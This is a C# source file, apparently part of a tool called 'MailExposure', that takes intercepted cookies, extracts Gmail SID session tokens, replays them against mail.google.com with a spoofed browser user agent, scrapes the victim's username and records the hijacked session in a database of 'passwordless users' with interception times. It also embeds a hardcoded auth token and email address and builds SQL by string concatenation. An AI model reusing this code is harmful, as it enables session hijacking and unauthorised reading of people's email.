using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.IO;
using System.Net;

namespace MailExposure.PopMailRC
{
    class FilterGmail:displace
    {
        // Fields
        private string nameTemp;
        private string urls;
        private int userIndex;
        private string UserName;

        // Methods
        public FilterGmail(string url, string strCookie, string interceptTime)
        {
            this.urls = "";
            this.UserName = "";
            this.nameTemp = "";
            base.url = url;
            base.cookie = strCookie;
            base.strCookie = strCookie;
            base.interceptTime = interceptTime;

        }
        public void loginUser()
        {
            base.cookie = base.putstr(base.cookie, "SID=", ";", 0);
            if (base.cookie != "-1")
            {
                base.cookie = "SID=" + base.cookie + ";";
                base.cookie = base.cookie.Replace("; ;", ";");
            }
            base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
            base.streamControl = true;
            base.MyStringBuilder = this.Request(base.url);
            base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
            base.streamControl = true;
            base.MyStringBuilder = this.Request("http://mail.google.com/mail/?ui=html&amp;amp;zy=l&amp;pli=1&amp;auth=DQAAAHAAAACMe2g-IY3nJUaTPU1xypZ0iIyyu-fHrHwscWJuO0yOHibPuJmLsceT_7pNbh2M5bhUCyMWM8eVYcWOE5HpoImp0sDOEcGm3k9sJ0hX0BTVV9ThLVM3c9do_levIHmh1ar80I2Q1HB-STxJaoQQKAhm&amp;gausr=aphelloemail%40gmail.com");
            string message = base.MyStringBuilder.ToString();
            if (message.IndexOf("class=\"hdn\"") != -1)
            {
                this.userIndex = message.IndexOf("class=\"hdn\"");
                this.nameTemp = base.putstr(message, "<b>", "@", this.userIndex);
                if (this.nameTemp != "-1")
                {
                    this.UserName = this.nameTemp;
                }
            }
            if ((this.UserName != "") && (this.UserName != null))
            {
                if (this.urls == "")
                {
                    this.urls = base.url;
                }
                string str2 = "'" + this.UserName + "'";
                string str3 = "'" + base.cookie + "'";
                string str4 = "'capG'";
                string str5 = "'G'";
                string str6 = "'" + base.interceptTime + "'";
                string str7 = "'无密用户'";
                string str8 = "'是'";
                string strSql = "insert into users(属主,用户名,服务器,服务器地址,方向,邮件地址,验证登陆,时间限制,用户类型,全部接收) values(" + str4 + "," + str2 + "," + str5 + "," + str5 + "," + str4 + ",'" + this.urls + "'," + str3 + "," + str6 + "," + str7 + "," + str8 + ")";
                string str10 = "select count(*)from users where 服务器地址=" + str5 + "and 用户名=" + str2 + "and 用户类型=" + str7;
                string str11 = "update users set 邮件地址='" + this.urls + "',验证登陆=" + str3 + ",时间限制=" + str6;
                if (Convert.ToInt32(GlobalValue.PopMainForm.ExecuteSQL(str10)) > 0)
                {
                    str10 = "select 时间限制 from users where 服务器地址=" + str5 + "and 用户名=" + str2 + "and 用户类型=" + str7;
                    DateTime time = DateTime.Parse(GlobalValue.PopMainForm.ExecuteSQL(str10));
                    if (DateTime.Compare(DateTime.Parse(base.interceptTime), time) > 0)
                    {
                        GlobalValue.PopMainForm.ExecuteSQL(str11);
                        GlobalValue.PopMainForm.listBoxView.Items.Add("[" + this.UserName + "]：修改用户！");
                    }
                }
                else
                {
                    GlobalValue.PopMainForm.ExecuteSQL(strSql);
                    GlobalValue.PopMainForm.listBoxView.Items.Add("[MISS]：添加用户：" + this.UserName);
                }
            }

        }
        private StringBuilder Request(string url)
        {
            try
            {
                StreamReader reader;
                if (url.IndexOf("https://www.google.com/accounts/ServiceLogin?") != -1)
                {
                    base.cookie = base.strCookie;
                }
                else if (url.IndexOf("https://mail.google.com/mail/?ui=html") != -1)
                {
                    base.cookie = base.putstr(base.cookie, "SID=", ";", 0);
                    if (base.cookie != "-1")
                    {
                        base.cookie = "SID=" + base.cookie + ";";
                        base.cookie = base.cookie.Replace("; ;", ";");
                    }
                }
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.Accept = "*/*";
                request.AllowAutoRedirect = false;
                request.ServicePoint.Expect100Continue = false;
                request.KeepAlive = true;
                request.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)";
                request.ContentType = "application/x-www-form-urlencoded";
                request.Headers.Add("Accept-Language: zh-cn");
                request.Headers.Add("Cookie", base.cookie);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                WebHeaderCollection headers = response.Headers;
                if (response.Headers["Set-Cookie"] != null)
                {
                    base.cookie = base.cook(response.Headers["Set-Cookie"]);
                }
                if (headers["Content-Type"] != null)
                {
                    string str = "";
                    str = headers["Content-Type"];
                    if (str.IndexOf("charset=") >= 0)
                    {
                        base.charSet = str.Substring(str.IndexOf("charset=") + 8, (str.Length - str.IndexOf("charset=")) - 8);
                    }
                }
                Thread.Sleep(10);
                if (((response.StatusCode == HttpStatusCode.Found) || (response.StatusCode == HttpStatusCode.MovedPermanently)) || ((response.StatusCode == HttpStatusCode.MovedPermanently) || (response.StatusCode == HttpStatusCode.Found)))
                {
                    this.urls = headers["location"];
                    if (this.urls.IndexOf("http") != -1)
                    {
                        this.Request(this.urls);
                    }
                }
                if ((base.charSet == null) || (base.charSet == "-1"))
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.Default);
                }
                else
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(base.charSet));
                }
                if (base.streamControl)
                {
                    base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                    for (string str2 = reader.ReadLine(); str2 != null; str2 = reader.ReadLine())
                    {
                        base.MyStringBuilder.Append(str2 + "\r\n");
                        str2 = null;
                    }
                    base.streamControl = false;
                }
                reader.Close();
            }
            catch (Exception)
            {
            }
            return base.MyStringBuilder;

        }

    }
}
